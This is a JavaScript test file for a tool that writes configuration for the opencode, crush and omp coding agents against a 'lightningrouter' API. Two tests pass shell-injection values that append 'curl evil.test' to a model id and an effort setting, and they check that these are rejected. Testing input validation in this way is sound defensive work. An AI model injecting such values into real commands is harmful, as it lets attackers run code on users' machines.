import assert from "node:assert/strict";
import test from "node:test";
import { centsFromText, setupFor } from "../setup.mjs";

const model = { id: "deepseek/deepseek-flash", name: "DeepSeek Flash", context: 128000, output: 8192 };
const base = "https://api.lightningrouter.ai/v1";

for (const [text, cents] of [["10", 1000], ["0.01", 1], ["5.5", 550], ["1000.00", 100000]]) {
  test(`exact cents ${text}`, () => assert.equal(centsFromText(text), cents));
}
for (const text of ["0", "1e2", "1.001", "Infinity", "-1", "1000.01", "1abc", ""]) {
  test(`reject invalid money ${text}`, () => assert.throws(() => centsFromText(text)));
}
for (const agent of ["opencode", "crush", "omp"]) {
  test(`${agent} has exact endpoint/model and environment-only credential`, () => {
    const result = setupFor(agent, model, base);
    assert.ok(result.config.includes(base));
    assert.ok(result.config.includes(model.id));
    assert.ok(result.config.includes("LIGHTNINGROUTER_API_KEY"));
    assert.ok(!result.config.includes("sk-tr-"));
    assert.ok(!result.config.includes("openrouter.ai"));
  });
}
test("OpenCode shape", () => {
  const json = JSON.parse(setupFor("opencode", model, base).config);
  assert.equal(json.provider.lightningrouter.npm, "@ai-sdk/openai-compatible");
  assert.equal(json.model, "lightningrouter/" + model.id);
});
test("Crush selects the custom provider", () => {
  const json = JSON.parse(setupFor("crush", model, base).config);
  assert.equal(json.models.large.provider, "lightningrouter");
  assert.equal(json.providers.lightningrouter.type, "openai-compat");
});
test("OMP uses current YAML file and explicit bearer", () => {
  const result = setupFor("omp", model, base);
  assert.equal(result.path, "~/.omp/agent/models.yml");
  assert.ok(result.config.includes("authHeader: true"));
});
test("model change updates every config", () => {
  for (const agent of ["opencode", "crush", "omp"]) {
    const result = setupFor(agent, { ...model, id: "kimi/kimi-k2.7" }, base);
    assert.ok(!result.config.includes(model.id));
    assert.ok(result.config.includes("kimi/kimi-k2.7"));
  }
});
test("malicious model cannot escape shell commands", () => {
  assert.throws(() => setupFor("omp", { ...model, id: "x'; curl evil.test" }, base));
});

for (const effort of ["low", "medium", "high"]) {
  test(`reasoning ${effort} reaches all three client configurations`, () => {
    const capable = { ...model, reasoning_effort: true };
    const opencode = JSON.parse(setupFor("opencode", capable, base, effort).config);
    assert.equal(opencode.provider.lightningrouter.models[model.id].options.reasoningEffort, effort);
    const crush = JSON.parse(setupFor("crush", capable, base, effort).config);
    for (const role of ["large", "small"]) assert.equal(crush.models[role].reasoning_effort, effort);
    assert.equal(crush.providers.lightningrouter.models[0].can_reason, true);
    assert.deepEqual(crush.providers.lightningrouter.models[0].reasoning_levels, ["low", "medium", "high"]);
    const omp = setupFor("omp", capable, base, effort);
    assert.ok(omp.command.endsWith(` --thinking ${effort}`));
    assert.ok(omp.config.includes("supportsReasoningEffort: true"));
    assert.ok(omp.config.includes("thinkingFormat: openai"));
    assert.ok(omp.config.includes("reasoning: true"));
  });
}
for (const agent of ["opencode", "crush", "omp"]) {
  test(`${agent} default omits explicit effort`, () => {
    assert.deepEqual(setupFor(agent, model, base, "default"), setupFor(agent, model, base));
    assert.ok(!setupFor(agent, model, base).config.includes("reasoning"));
  });
  test(`${agent} rejects unadvertised or invalid effort`, () => {
    assert.throws(() => setupFor(agent, model, base, "high"));
    assert.throws(() => setupFor(agent, { ...model, reasoning_effort: true }, base, "high; curl evil.test"));
  });
}
